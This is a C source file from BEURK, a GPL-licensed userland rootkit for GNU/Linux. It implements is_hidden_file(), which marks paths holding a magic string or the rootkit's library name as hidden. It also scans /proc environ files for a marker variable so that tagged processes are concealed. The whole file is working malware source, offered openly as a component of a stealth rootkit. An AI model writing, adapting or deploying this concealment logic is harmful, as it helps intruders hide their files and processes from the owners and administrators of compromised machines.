/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <sys/stat.h> /* struct stat */
#include <string.h> /* strstr() */
#include <limits.h> /* PATH_MAX */
#include "beurk.h" /* DEBUG(),  prototype */
#include "config.h" /* FILE, MAX_LEN, MAGIC_STRING, LIBRARY_NAME, ... */

int         is_hidden_file(const char *path) {
    DEBUG(D_INFO, "called is_hidden_file()");

    FILE        *env_file;
    char        environ[PATH_MAX];
    char        line[MAX_LEN];
    struct stat s_fstat;

    if (strstr(path, MAGIC_STRING) || strstr(path, LIBRARY_NAME))
        return (1);

    if (strstr(path, PROC_PATH)) {
        if (REAL_STAT(path, &s_fstat) != -1) {
            snprintf(environ, PATH_MAX, ENV_LINE, path);

            if (REAL_STAT(environ, &s_fstat) != -1) {
                env_file = REAL_FOPEN(environ, "r");

                if (env_file) {
                    while (fgets(line, MAX_LEN, env_file)) {
                        if (strstr(line, HIDDEN_ENV_VAR))
                            return 1;

                        memset(line, 0x00, MAX_LEN);
                    }
                    fclose(env_file);
                }
            }
        }
    }
    return 0;
}
